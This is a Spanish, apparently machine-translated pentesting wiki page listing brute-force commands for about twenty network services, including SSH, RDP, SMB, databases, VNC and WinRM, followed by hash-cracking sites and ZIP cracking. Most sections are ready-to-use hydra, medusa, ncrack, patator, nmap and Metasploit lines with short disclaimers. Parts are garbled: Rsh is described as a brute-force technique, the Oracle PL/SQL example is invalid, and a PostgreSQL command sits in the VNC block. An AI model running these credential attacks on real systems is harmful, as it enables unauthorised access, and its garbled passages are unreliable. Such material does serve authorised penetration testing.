Un ataque de fuerza bruta es un método utilizado por los hackers para descubrir contraseñas o claves de acceso a través de la prueba sistemática de todas las combinaciones posibles. En el caso de MySQL, un ataque de fuerza bruta implica intentar adivinar la contraseña de un usuario o una cuenta de administrador.

Existen varias herramientas y técnicas disponibles para llevar a cabo un ataque de fuerza bruta contra MySQL. Algunas de las más comunes incluyen:

- **Hydra**: una herramienta de línea de comandos que puede realizar ataques de fuerza bruta contra varios protocolos, incluido MySQL.
- **Medusa**: una herramienta similar a Hydra que también puede realizar ataques de fuerza bruta contra MySQL.
- **Diccionarios de contraseñas**: estos archivos contienen una lista de contraseñas comunes que se utilizan para probar en un ataque de fuerza bruta.

Es importante tener en cuenta que los ataques de fuerza bruta son ilegales y están sujetos a sanciones legales. Solo se deben realizar ataques de fuerza bruta en sistemas autorizados y con el consentimiento del propietario del sistema.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
# Fuerza bruta

La fuerza bruta es una técnica comúnmente utilizada en el campo de la seguridad informática para descifrar contraseñas o encontrar información sensible. Consiste en probar todas las combinaciones posibles de caracteres hasta encontrar la correcta.

En el contexto de OracleSQL, la fuerza bruta se puede utilizar para intentar adivinar contraseñas de usuarios o nombres de esquemas. Esto se logra mediante la ejecución de consultas repetitivas con diferentes combinaciones de caracteres hasta encontrar la combinación correcta.

Es importante tener en cuenta que la fuerza bruta puede ser un proceso lento y consumir muchos recursos, especialmente si se utilizan contraseñas largas o complejas. Además, es una técnica que puede ser detectada fácilmente por sistemas de seguridad si se realizan demasiados intentos fallidos en un corto período de tiempo.

A continuación se muestra un ejemplo de cómo se puede implementar la fuerza bruta en OracleSQL para intentar adivinar una contraseña:

```sql
DECLARE
    v_password VARCHAR2(20);
BEGIN
    FOR i IN 1..10000 LOOP
        v_password := 'password' || i;
        BEGIN
            EXECUTE IMMEDIATE 'ALTER SESSION SET CURRENT_SCHEMA = SCHEMA_NAME IDENTIFIED BY ' || v_password;
            DBMS_OUTPUT.PUT_LINE('Contraseña encontrada: ' || v_password);
            EXIT;
        EXCEPTION
            WHEN OTHERS THEN
                NULL;
        END;
    END LOOP;
END;
/
```

En este ejemplo, se utiliza un bucle `FOR` para generar diferentes combinaciones de contraseñas, que se concatenan con la cadena `'password'`. Luego, se intenta cambiar el esquema actual utilizando la contraseña generada. Si la ejecución tiene éxito, se muestra un mensaje indicando que se ha encontrado la contraseña y se sale del bucle.

Es importante destacar que la fuerza bruta es una técnica que puede ser considerada ilegal o inapropiada en muchos contextos, a menos que se realice con el consentimiento y la autorización adecuada. Se recomienda utilizarla solo con fines educativos o en el marco de pruebas de penetración éticas.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
Para utilizar **oracle\_login** con **patator**, necesitas **instalar**:
```bash
pip3 install cx_Oracle --upgrade
```
[Fuerza bruta de hash de OracleSQL sin conexión](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versiones 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** y **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
# Fuerza Bruta

La fuerza bruta es una técnica de hacking que implica probar todas las posibles combinaciones de contraseñas hasta encontrar la correcta. Es un enfoque simple pero efectivo para obtener acceso no autorizado a sistemas protegidos por contraseña.

## Metodología

La metodología de fuerza bruta generalmente sigue estos pasos:

1. **Recopilación de información**: El primer paso es recopilar información sobre el objetivo, como nombres de usuario, direcciones de correo electrónico o cualquier otra información que pueda ayudar a adivinar la contraseña.

2. **Generación de combinaciones**: A continuación, se generan todas las posibles combinaciones de contraseñas utilizando diferentes técnicas, como la combinación de palabras comunes, números y símbolos.

3. **Prueba de combinaciones**: Luego, se prueban todas las combinaciones generadas una por una hasta encontrar la contraseña correcta. Esto se puede hacer manualmente o utilizando herramientas automatizadas.

4. **Extracción de información**: Una vez que se ha obtenido acceso al sistema, se puede extraer información confidencial o realizar otras acciones maliciosas según los objetivos del atacante.

## Recursos

Existen varias herramientas y recursos disponibles para llevar a cabo ataques de fuerza bruta. Algunas de las herramientas más populares incluyen:

- **Hydra**: Una herramienta de fuerza bruta muy conocida que admite una amplia gama de protocolos y servicios.

- **Medusa**: Otra herramienta de fuerza bruta que se puede utilizar para atacar varios servicios y protocolos.

- **John the Ripper**: Una herramienta de cracking de contraseñas que también se puede utilizar para realizar ataques de fuerza bruta.

Además de estas herramientas, también es posible escribir scripts personalizados o utilizar otras herramientas disponibles en línea para llevar a cabo ataques de fuerza bruta.

Es importante tener en cuenta que la fuerza bruta es un método intrusivo y puede ser ilegal realizarlo sin el consentimiento del propietario del sistema objetivo. Se recomienda utilizar estas técnicas solo con fines legítimos, como pruebas de penetración autorizadas o auditorías de seguridad.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQL es un sistema de gestión de bases de datos relacional de código abierto y altamente escalable. Es ampliamente utilizado en aplicaciones web y empresariales debido a su capacidad para manejar grandes volúmenes de datos y su soporte para consultas complejas.

#### Ataques de fuerza bruta contra PostgreSQL

Un ataque de fuerza bruta es una técnica utilizada para descubrir contraseñas o credenciales de acceso a través de la prueba sistemática de todas las combinaciones posibles. En el caso de PostgreSQL, un ataque de fuerza bruta se puede utilizar para intentar adivinar la contraseña de un usuario y obtener acceso no autorizado a la base de datos.

Existen varias herramientas y recursos disponibles para llevar a cabo un ataque de fuerza bruta contra PostgreSQL. Algunas de las herramientas más populares incluyen Hydra, Medusa y Ncrack. Estas herramientas permiten automatizar el proceso de prueba de contraseñas y pueden probar miles de combinaciones por segundo.

Sin embargo, es importante tener en cuenta que los ataques de fuerza bruta son ilegales y están estrictamente prohibidos sin el consentimiento explícito del propietario del sistema. Además, los ataques de fuerza bruta pueden ser detectados y bloqueados por medidas de seguridad como bloqueos de IP, limitaciones de intentos de inicio de sesión y sistemas de detección de intrusos.

Para protegerse contra los ataques de fuerza bruta, es recomendable utilizar contraseñas fuertes y complejas, implementar bloqueos de IP después de un número determinado de intentos fallidos de inicio de sesión y mantener el software de PostgreSQL actualizado con los últimos parches de seguridad. Además, se recomienda utilizar autenticación de dos factores para agregar una capa adicional de seguridad a las credenciales de acceso.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

Puedes descargar el paquete `.deb` para instalar desde [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

El Protocolo de Escritorio Remoto (RDP, por sus siglas en inglés) es un protocolo de red desarrollado por Microsoft que permite a los usuarios controlar y acceder a un equipo remoto a través de una conexión de red. RDP utiliza el puerto 3389 por defecto y es ampliamente utilizado para la administración remota de sistemas Windows.

#### Ataques de fuerza bruta contra RDP

Los ataques de fuerza bruta contra RDP son una técnica común utilizada por los hackers para intentar adivinar las credenciales de inicio de sesión de un sistema remoto. Consiste en probar diferentes combinaciones de nombres de usuario y contraseñas hasta encontrar las correctas.

Existen varias herramientas disponibles que automatizan este proceso, como Hydra, Medusa y Ncrack. Estas herramientas pueden probar miles de combinaciones por segundo, lo que las hace muy efectivas para romper contraseñas débiles.

Para protegerse contra los ataques de fuerza bruta en RDP, se recomienda seguir las siguientes medidas de seguridad:

- Utilizar contraseñas fuertes y únicas para las cuentas de usuario.
- Implementar bloqueo de cuenta después de un número determinado de intentos fallidos.
- Configurar una política de contraseña que requiera contraseñas complejas.
- Utilizar una solución de autenticación de dos factores para agregar una capa adicional de seguridad.

Además, es importante mantener el sistema operativo y las aplicaciones actualizadas para evitar vulnerabilidades conocidas que podrían ser explotadas por los atacantes.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
# Fuerza bruta

La fuerza bruta es una técnica comúnmente utilizada en el hacking para descifrar contraseñas o claves de cifrado mediante la prueba exhaustiva de todas las posibles combinaciones. En el contexto de Redis, la fuerza bruta se puede utilizar para intentar adivinar contraseñas de acceso a una instancia de Redis.

## Herramientas de fuerza bruta

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta en Redis. Algunas de las herramientas más populares incluyen:

- **Hydra**: una herramienta de fuerza bruta muy conocida y ampliamente utilizada que admite varios protocolos, incluido Redis.
- **Medusa**: otra herramienta de fuerza bruta que puede utilizarse para atacar contraseñas de Redis.
- **Ncrack**: una herramienta de autenticación en red que también puede utilizarse para realizar ataques de fuerza bruta en Redis.

## Métodos de protección contra ataques de fuerza bruta

Para proteger una instancia de Redis contra ataques de fuerza bruta, se pueden implementar las siguientes medidas:

- **Contraseñas fuertes**: utilizar contraseñas largas y complejas dificulta el proceso de adivinación.
- **Bloqueo de IP**: configurar Redis para bloquear automáticamente las direcciones IP después de un número determinado de intentos fallidos.
- **Limitación de intentos**: establecer un límite en el número de intentos de inicio de sesión permitidos en un período de tiempo determinado.
- **Autenticación de dos factores**: implementar una capa adicional de seguridad mediante la autenticación de dos factores.

Es importante tener en cuenta que ninguna medida de protección es infalible y siempre es recomendable mantener Redis actualizado y seguir las mejores prácticas de seguridad.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Rexec, también conocido como Remote Execution Service, es un protocolo de red que permite a un usuario ejecutar comandos en un sistema remoto. Este protocolo se utiliza comúnmente en entornos de red para administrar sistemas y realizar tareas de administración remota.

El ataque de fuerza bruta en Rexec implica intentar adivinar las credenciales de inicio de sesión de un sistema remoto mediante la prueba de diferentes combinaciones de nombres de usuario y contraseñas. Este método es efectivo cuando se utilizan credenciales débiles o cuando no se han implementado medidas de seguridad adecuadas.

Para llevar a cabo un ataque de fuerza bruta en Rexec, se utilizan herramientas como Hydra o Medusa, que automatizan el proceso de prueba de credenciales. Estas herramientas intentan diferentes combinaciones de nombres de usuario y contraseñas hasta encontrar las correctas.

Es importante tener en cuenta que realizar un ataque de fuerza bruta en un sistema sin permiso es ilegal y puede tener consecuencias legales graves. Solo se debe realizar un ataque de fuerza bruta en un sistema con el consentimiento explícito del propietario y como parte de una evaluación de seguridad autorizada, como una prueba de penetración.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin (Remote Login) es un protocolo de red que permite a un usuario iniciar sesión en un sistema remoto a través de una red. Este protocolo utiliza el puerto 513 y se basa en la autenticación mediante contraseña.

El ataque de fuerza bruta en Rlogin implica intentar adivinar la contraseña correcta probando diferentes combinaciones de contraseñas hasta encontrar la correcta. Este tipo de ataque puede ser automatizado utilizando herramientas como Hydra o Medusa.

Es importante tener en cuenta que el uso de fuerza bruta para acceder a sistemas remotos sin autorización es ilegal y está sujeto a sanciones legales. Solo se debe realizar este tipo de ataque con el permiso explícito del propietario del sistema y como parte de una evaluación de seguridad autorizada, como una prueba de penetración.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

El Rsh (Remote Shell) es un protocolo de red que permite a un usuario ejecutar comandos en un sistema remoto. Es similar al comando `ssh`, pero sin la autenticación segura. El Rsh utiliza un enfoque de fuerza bruta para adivinar las credenciales de inicio de sesión del sistema remoto.

La técnica de fuerza bruta consiste en probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. Esto se logra mediante el uso de herramientas automatizadas que generan contraseñas y las prueban una por una. El proceso puede llevar mucho tiempo, ya que implica probar una gran cantidad de combinaciones.

El Rsh es una técnica de hacking que puede ser utilizada por atacantes para obtener acceso no autorizado a sistemas remotos. Es importante tener en cuenta que el uso de esta técnica es ilegal y puede tener graves consecuencias legales.

Para protegerse contra ataques de fuerza bruta como el Rsh, es recomendable utilizar contraseñas seguras y complejas, así como implementar medidas de seguridad adicionales, como la autenticación de dos factores. Además, es importante mantener el software y los sistemas actualizados para evitar vulnerabilidades conocidas que podrían ser explotadas por los atacantes.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync es una herramienta de sincronización de archivos que se utiliza comúnmente en sistemas Unix y Linux. Permite la transferencia eficiente de datos entre sistemas locales y remotos a través de una conexión segura. Rsync utiliza un algoritmo de sincronización inteligente que solo transfiere las partes modificadas de un archivo, lo que lo hace rápido y eficiente.

Sin embargo, Rsync también puede ser utilizado como una herramienta de fuerza bruta para descubrir contraseñas débiles o predecibles. Esto se debe a que Rsync permite la autenticación basada en contraseña y no tiene mecanismos de protección contra ataques de fuerza bruta incorporados.

Para llevar a cabo un ataque de fuerza bruta con Rsync, se pueden utilizar herramientas como "rsh-grind". Estas herramientas automatizan el proceso de intentar diferentes combinaciones de contraseñas hasta encontrar la correcta. Es importante tener en cuenta que realizar un ataque de fuerza bruta sin permiso explícito es ilegal y puede tener consecuencias legales graves.

Es fundamental proteger los sistemas Rsync con contraseñas seguras y utilizar mecanismos adicionales de autenticación, como claves SSH, para evitar ataques de fuerza bruta. Además, se recomienda implementar medidas de seguridad adicionales, como limitar el acceso a Rsync solo desde direcciones IP confiables y monitorear los registros de actividad en busca de posibles intentos de ataque.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

El Protocolo de Transmisión en Tiempo Real (RTSP, por sus siglas en inglés) es un protocolo de red utilizado para controlar la transmisión de medios en tiempo real, como audio y video, a través de redes IP. RTSP permite la reproducción continua de medios y la interacción con el servidor de medios.

#### Ataques de fuerza bruta contra RTSP

Los ataques de fuerza bruta son una técnica común utilizada para intentar adivinar contraseñas o claves de acceso. En el caso de RTSP, un ataque de fuerza bruta implica intentar adivinar la contraseña de un servidor RTSP mediante la prueba de diferentes combinaciones de contraseñas.

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta contra servidores RTSP. Estas herramientas automatizan el proceso de prueba de contraseñas y pueden probar miles de combinaciones en poco tiempo.

Es importante tener en cuenta que los ataques de fuerza bruta son ilegales y están sujetos a sanciones legales. Solo se deben realizar ataques de fuerza bruta en sistemas y redes autorizadas, como parte de una evaluación de seguridad o una prueba de penetración.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

El Protocolo Simple de Administración de Red (SNMP, por sus siglas en inglés) es un protocolo de red utilizado para administrar y supervisar dispositivos en una red. SNMP permite a los administradores de red recopilar información y controlar dispositivos de red, como routers, switches y servidores.

El protocolo SNMP utiliza una estructura de datos jerárquica llamada MIB (Base de Información de Administración) para organizar y almacenar información sobre los dispositivos de red. Los administradores pueden utilizar herramientas de gestión de red para acceder a la MIB y obtener información sobre el estado y el rendimiento de los dispositivos.

Una técnica común utilizada en el hacking es el ataque de fuerza bruta, que implica probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. Esto se puede aplicar al protocolo SNMP para intentar adivinar la cadena de comunidad, que es una especie de contraseña utilizada para autenticar y autorizar las solicitudes SNMP.

Los hackers pueden utilizar herramientas automatizadas para realizar ataques de fuerza bruta en el protocolo SNMP. Estas herramientas intentarán todas las combinaciones posibles de cadenas de comunidad hasta encontrar la correcta. Una vez que se ha adivinado la cadena de comunidad, el hacker puede obtener acceso no autorizado al dispositivo y realizar acciones maliciosas.

Para protegerse contra los ataques de fuerza bruta en SNMP, es importante utilizar cadenas de comunidad fuertes y únicas. Además, se deben implementar medidas de seguridad adicionales, como el filtrado de direcciones IP y la autenticación de usuarios, para evitar el acceso no autorizado a los dispositivos de red.

En resumen, SNMP es un protocolo utilizado para administrar y supervisar dispositivos de red. Sin embargo, puede ser vulnerable a ataques de fuerza bruta si no se implementan medidas de seguridad adecuadas. Los administradores de red deben tomar precauciones para proteger sus dispositivos contra estos ataques.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB (Server Message Block) es un protocolo de red utilizado para compartir archivos, impresoras y otros recursos en una red local. Es comúnmente utilizado en entornos Windows y permite a los usuarios acceder y administrar recursos compartidos en una red.

El protocolo SMB también puede ser utilizado por los hackers como una vía para realizar ataques de fuerza bruta. Un ataque de fuerza bruta consiste en intentar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. En el caso de SMB, un hacker puede utilizar herramientas automatizadas para intentar adivinar la contraseña de una cuenta de usuario o de un recurso compartido.

Para protegerse contra los ataques de fuerza bruta en SMB, es importante utilizar contraseñas fuertes y complejas, que sean difíciles de adivinar. Además, se recomienda implementar medidas de seguridad adicionales, como bloquear direcciones IP sospechosas o limitar el número de intentos de inicio de sesión fallidos.

En resumen, SMB es un protocolo de red utilizado para compartir recursos en una red local. Sin embargo, también puede ser utilizado por hackers para realizar ataques de fuerza bruta. Es importante tomar medidas de seguridad para protegerse contra estos ataques.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
El protocolo SMTP (Simple Mail Transfer Protocol) es un protocolo de red utilizado para enviar correos electrónicos a través de Internet. SMTP es un protocolo de texto sin estado que se basa en el modelo cliente-servidor. El cliente SMTP se utiliza para enviar mensajes de correo electrónico al servidor SMTP, que luego se encarga de entregar el mensaje al destinatario.

#### Ataques de fuerza bruta contra SMTP

Un ataque de fuerza bruta contra SMTP es un método utilizado por los hackers para obtener acceso no autorizado a una cuenta de correo electrónico. En este tipo de ataque, el hacker intenta adivinar la contraseña correcta probando diferentes combinaciones de contraseñas hasta encontrar la correcta.

Existen varias herramientas y técnicas disponibles para llevar a cabo un ataque de fuerza bruta contra SMTP. Algunas de las herramientas más comunes incluyen Hydra, Medusa y Ncrack. Estas herramientas automatizan el proceso de adivinación de contraseñas y pueden probar miles de combinaciones en poco tiempo.

Para protegerse contra los ataques de fuerza bruta contra SMTP, es importante utilizar contraseñas seguras y difíciles de adivinar. Además, se recomienda implementar medidas de seguridad adicionales, como la autenticación de dos factores, que requiere un segundo factor de autenticación además de la contraseña.

En resumen, los ataques de fuerza bruta contra SMTP son una técnica utilizada por los hackers para obtener acceso no autorizado a cuentas de correo electrónico. Es importante tomar medidas para protegerse contra estos ataques, como utilizar contraseñas seguras y medidas de seguridad adicionales.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
### SOCKS

SOCKS (Socket Secure) es un protocolo de red que permite a los usuarios enviar y recibir datos a través de un servidor proxy. A diferencia de otros protocolos de proxy, SOCKS no está diseñado para inspeccionar o filtrar el tráfico de red, sino que actúa como un intermediario entre el cliente y el servidor.

El uso de SOCKS es común en el ámbito de la seguridad informática, ya que permite a los usuarios ocultar su dirección IP real y enrutar su tráfico a través de un servidor proxy. Esto puede ser útil para eludir restricciones geográficas, acceder a contenido bloqueado o proteger la privacidad en línea.

Una técnica común utilizada en el hacking es el ataque de fuerza bruta, que consiste en probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. SOCKS puede ser utilizado en este tipo de ataques para ocultar la dirección IP del atacante y evitar ser detectado.

Es importante tener en cuenta que el uso de SOCKS para actividades ilegales o no autorizadas está estrictamente prohibido y puede tener consecuencias legales graves. Siempre es recomendable utilizar SOCKS de manera ética y legal, respetando la privacidad y los derechos de los demás.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH (Secure Shell) es un protocolo de red que permite a los usuarios acceder y administrar de forma segura un sistema remoto. Utiliza técnicas de cifrado para proteger la comunicación entre el cliente y el servidor, evitando así que los datos sean interceptados o modificados por terceros.

El ataque de fuerza bruta es una técnica comúnmente utilizada para intentar obtener acceso no autorizado a un sistema SSH. Consiste en probar diferentes combinaciones de contraseñas hasta encontrar la correcta. Los atacantes suelen utilizar diccionarios de contraseñas predefinidos o generados automáticamente para realizar este tipo de ataque.

Para protegerse contra los ataques de fuerza bruta en SSH, es importante seguir algunas buenas prácticas de seguridad:

- Utilizar contraseñas fuertes y únicas para cada cuenta de usuario.
- Configurar el servidor SSH para que limite el número de intentos de inicio de sesión fallidos.
- Implementar medidas adicionales de autenticación, como el uso de claves SSH en lugar de contraseñas.
- Mantener el software SSH actualizado con las últimas correcciones de seguridad.
- Monitorear los registros de inicio de sesión para detectar actividades sospechosas.

Al seguir estas prácticas, se puede reducir significativamente el riesgo de un ataque de fuerza bruta exitoso en SSH y mantener la seguridad de los sistemas remotos.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### Claves SSH débiles / PRNG predecible de Debian

Algunos sistemas tienen fallas conocidas en la semilla aleatoria utilizada para generar material criptográfico. Esto puede resultar en un espacio de claves dramáticamente reducido que puede ser sometido a fuerza bruta con herramientas como [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). También están disponibles conjuntos pregenerados de claves débiles, como [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### Telnet

Telnet es un protocolo de red que permite la comunicación bidireccional entre dos dispositivos a través de una conexión TCP/IP. Es comúnmente utilizado para acceder y administrar dispositivos remotos, como servidores y enrutadores.

El ataque de fuerza bruta en Telnet implica intentar adivinar las credenciales de acceso al dispositivo objetivo probando diferentes combinaciones de nombres de usuario y contraseñas. Este método es efectivo cuando el dispositivo objetivo tiene credenciales débiles o predeterminadas.

Para llevar a cabo un ataque de fuerza bruta en Telnet, se utilizan herramientas como Hydra o Medusa, que automatizan el proceso de prueba de credenciales. Estas herramientas intentan diferentes combinaciones de nombres de usuario y contraseñas hasta encontrar las correctas.

Es importante tener en cuenta que el uso de fuerza bruta para acceder a dispositivos o sistemas sin autorización es ilegal y puede tener consecuencias legales graves. Solo se debe realizar un ataque de fuerza bruta en Telnet con el permiso explícito del propietario del dispositivo o sistema.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC (Virtual Network Computing) es un protocolo que permite controlar de forma remota un ordenador a través de una red. Es ampliamente utilizado para acceder y administrar sistemas de forma remota.

#### Ataques de fuerza bruta contra VNC

Un ataque de fuerza bruta contra VNC implica intentar adivinar la contraseña de acceso al sistema mediante la prueba de diferentes combinaciones de contraseñas. Este tipo de ataque puede ser efectivo si la contraseña es débil o si no se han tomado medidas de seguridad adicionales.

#### Herramientas de fuerza bruta para VNC

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta contra VNC. Algunas de las herramientas más populares incluyen Hydra, Medusa y Ncrack. Estas herramientas automatizan el proceso de prueba de contraseñas y pueden probar miles de combinaciones en poco tiempo.

#### Mitigación de ataques de fuerza bruta contra VNC

Para mitigar los ataques de fuerza bruta contra VNC, se recomienda seguir las siguientes medidas de seguridad:

- Utilizar contraseñas fuertes y únicas para el acceso a VNC.
- Limitar el número de intentos de inicio de sesión fallidos antes de bloquear la cuenta.
- Implementar medidas de seguridad adicionales, como el uso de autenticación de dos factores.
- Mantener el software VNC actualizado con las últimas correcciones de seguridad.
- Utilizar una conexión segura, como SSH, para acceder al sistema en lugar de VNC directamente a través de Internet.

Al seguir estas medidas de seguridad, se puede reducir significativamente el riesgo de un ataque de fuerza bruta exitoso contra VNC.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm es un protocolo de administración remota desarrollado por Microsoft que permite a los administradores controlar y administrar sistemas Windows de forma remota. Winrm utiliza el protocolo SOAP (Simple Object Access Protocol) sobre HTTP o HTTPS para la comunicación entre el cliente y el servidor.

El ataque de fuerza bruta en Winrm implica intentar adivinar las credenciales de inicio de sesión de un sistema Windows utilizando un método de prueba y error. Esto se logra enviando múltiples combinaciones de nombres de usuario y contraseñas hasta que se encuentra una coincidencia exitosa.

Para llevar a cabo un ataque de fuerza bruta en Winrm, se pueden utilizar herramientas como Hydra o Medusa, que automatizan el proceso de envío de solicitudes de autenticación con diferentes combinaciones de credenciales.

Es importante tener en cuenta que los ataques de fuerza bruta son ilegales y están estrictamente prohibidos sin el consentimiento explícito del propietario del sistema objetivo. Estos ataques pueden causar daños graves y violar la privacidad y seguridad de los sistemas y datos.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo impulsados por las herramientas comunitarias más avanzadas del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Local

### Bases de datos de cracking en línea

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 y SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 con/sin ESS/SSP y con cualquier valor de desafío)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, capturas WPA2 y archivos MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes y hashes de archivos)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Revise esto antes de intentar realizar un ataque de fuerza bruta a un hash.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
